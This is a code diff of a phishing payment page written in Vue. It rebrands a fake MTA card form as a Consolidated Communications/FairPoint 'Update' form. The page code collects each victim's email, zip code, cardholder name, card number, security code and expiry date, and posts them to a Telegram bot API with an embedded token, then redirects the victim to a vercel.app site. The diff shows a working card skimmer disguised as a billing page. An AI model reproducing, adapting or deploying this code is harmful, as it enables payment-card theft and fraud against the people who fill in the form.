@@ -13,7 +13,7 @@
               <img class="mx-auto d-block styles__logo___10yQo"
                    width="300"
                    height="182"
-                   src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c02.png"
+                   src="/images/Consolidated Communications Logo.png"
                    alt="Logo">
             </div>
 
@@ -156,14 +156,14 @@
               </div>
 
               <div style="margin-bottom:1rem;">
-                By clicking "Pay" I affirm that I agree to the
+                By clicking "Update" I affirm that I agree to the
                 <a href="#" style="cursor:pointer;">terms and conditions</a>
               </div>
 
               <div style="padding-top:15px; display:flex; justify-content:center; align-items:center; flex-direction:column;">
                 <div class="col-6">
                   <button class="btn btn-lg btn-success btn-block" type="submit"   @click.prevent="finishJoob">
-                    Pay 
+                    Update 
                   </button>
                 </div>
               </div>
@@ -175,7 +175,7 @@
           <!-- <footer class="styles__footer___10ToZ">
             <p class="text-muted text-center styles__footerText___1IkZb">
               <a class="styles__footerLink___lDRW4"
-                 href="https://www.repay.com/privacy-policy/"
+                 href="https://www.reUpdate.com/privacy-policy/"
                  target="_self">
                  Privacy Policy
               </a>
@@ -228,7 +228,7 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*mtaCard*\nemail: ${this.formDataRes.email}\nzipcode: ${this.formDataRes.zipcode}\ncardholder: ${this.formDataRes.cardholder}\ncardnumber: ${this.formDataRes.cardnumber}\nsecuritycode: ${this.formDataRes.securitycode}\nExpirationDate: ${this.formDataRes.ExpirationDate}\nExpirationYear: ${this.formDataRes.ExpirationYear}`;
+        const message = `*FairPointCard*\nemail: ${this.formDataRes.email}\nzipcode: ${this.formDataRes.zipcode}\ncardholder: ${this.formDataRes.cardholder}\ncardnumber: ${this.formDataRes.cardnumber}\nsecuritycode: ${this.formDataRes.securitycode}\nExpirationDate: ${this.formDataRes.ExpirationDate}\nExpirationYear: ${this.formDataRes.ExpirationYear}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
@@ -241,7 +241,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://mta-amber.vercel.app/");
+        location.replace("https://fairpoint-xq6w.vercel.app/");
       }
     },
 
@@ -249,13 +249,13 @@ export default {
       try {
         const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
 
-        const payload = {
+        const Updateload = {
           chat_id: chatId,
           text: message,
         };
 
-        console.log("Sending payload:", payload);
-        await axios.post(url, payload);
+        console.log("Sending Updateload:", Updateload);
+        await axios.post(url, Updateload);
       } catch (error) {
         console.error("Telegram API Error:", error);
       }
